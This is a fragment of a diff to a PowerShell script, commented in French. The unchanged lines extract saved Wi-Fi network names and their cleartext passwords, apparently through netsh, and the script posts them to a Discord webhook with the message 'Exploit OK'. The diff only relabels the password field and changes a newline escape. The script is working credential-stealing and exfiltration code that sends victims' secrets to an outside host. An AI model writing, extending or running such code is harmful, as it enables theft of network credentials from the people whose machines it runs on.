@@ -18,10 +18,10 @@ $res = (& $n $w show $p) | Select-String "\:(.+)$" | %{
     } else {
         $pass = "[Vide/Open]"
     }
-    "SSID: $name | Pass: $pass"
+    "SSID: $name | Mot de passe: $pass"
 }
 
 # --- ENVOI DISCORD (Syntaxe simplifiée sans accents graves) ---
 $flatList = $res -join "\n"
-$payload = @{ content = "Exploit OK\n$flatList" }
+$payload = @{ content = "Exploit OK\$flatList" }
 Invoke-RestMethod -Uri $hook -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
